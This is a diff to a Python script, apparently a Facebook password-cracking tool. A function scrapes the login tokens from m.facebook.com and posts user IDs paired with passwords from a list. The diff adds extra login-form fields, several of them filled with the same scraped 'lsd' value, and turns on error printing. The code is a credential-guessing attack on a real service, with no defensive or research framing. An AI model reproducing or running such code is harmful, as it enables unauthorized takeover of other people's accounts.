@@ -1838,15 +1838,29 @@ def p(uid,pwx,tl):
             ses = requests.Session()
             free_fb = ses.get('https://m.facebook.com').text
             data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":'',
-            "li":'',
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":pw,
-            "login":"Log In"}
+            'm_ts': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'true',
+            'bi_xrwh': '0',
+            'pass': pw,
+            'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '',
+            'csr': '',
+            'req': '1',
+            'a': '',
+            '__user': '0',
+            '_fb_noscript': 'true'}
             headers = {
             'authority': 'm.facebook.com',
             'method': 'GET',
@@ -1898,7 +1912,7 @@ def p(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        #print({error})
+        print({error})
         pass
 
 def x(uid,pwx,tl):
